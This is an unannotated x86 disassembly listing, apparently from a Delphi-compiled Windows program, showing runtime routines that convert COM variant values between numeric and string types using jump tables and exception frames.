push sub_411f3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f94c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411f98
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f44
lea eax [ ebp - 0x18 ]
call sub_40f624
retn
sub_411f4c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411f98
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411fb4 ]
mov eax ebx
call sub_411d50
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411e9c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411d50
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411e3c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411f98
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411e9c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411ee8
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40edec
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411f4c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411e9c
fstp [ esp ]
fwait
mov eax ebx
call sub_411e9c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41217f ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411e9c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411d50
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411e3c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411f98
fstp [ esp ]
fwait
jmp r-xdata
sub_4122e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_412394
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4132dc
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409b14
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41239b
lea eax [ ebp - 0x10 ]
call sub_404120
lea eax [ ebp - 0xc ]
call sub_40482c
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40f280
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40f280
jmp r-xdata
sub_4123a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f280
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_412404
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f280
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_412450
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4124a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f94c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_412500
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4124ac
lea eax [ ebp - 0x18 ]
call sub_40f624
retn
sub_4124b4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_412500
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41251c ]
mov eax ebx
call sub_4122e8
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4122e8
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4123a4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412500
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_412450
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40edec
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4124b4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_412721 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_412404
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4122e8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4123a4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412500
fistp [ esp ]
fwait
jmp r-xdata
sub_4128cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40482c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40f280
pop ebx
pop ebp
retn 0x8
sub_412904
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40482c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40f280
pop ebx
pop ebp
retn 0x8
sub_41293c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4129f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40482c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40f280
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129f9
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_408144
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404978
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4043a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408108
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404978
jmp r-xdata
jmp r-xdata
call sub_40ee88
sub_412a00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412abf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412a9d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40f280
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40493c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412aa4
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_412acc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f94c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412bb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b29
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_412b30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41670c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ba5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f624
retn
sub_412bb4
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4130eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412bed ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404174
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404120
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404174
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409a04
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404174
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409a04
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404174
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4128cc
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412904
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4043a8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40493c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4043a8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_41293c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4043a8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4086ac
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404174
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4086ac
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412bb4
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412a00
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404174
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130f2
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_404144
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404844
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_404144
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404844
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412acc
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404174
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404174
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40edec
test ah 0x40
je r-xdata
mov eax esi
call sub_404120
mov edx eax
mov eax ebx
call sub_412b30
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_412a00
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_404174
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412a00
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404174
jmp r-xdata
jmp [ eax * 4 + jump_table_412e81 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409a04
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409a04
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4128cc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4043a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412904
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4043a8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404348
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41293c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4043a8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4086ac
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4086ac
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412bb4
jmp r-xdata
sub_4130f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4131a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413185
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40f280
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40493c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41318c
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_4131b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413206
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f94c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4132dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41320d
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_413214
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4132cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41670c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132d3
lea eax [ ebp - 0x20 ]
call sub_40482c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4132af
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40493c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f624
retn
sub_4132dc
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41382e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_413316 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404978
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40482c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404978
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
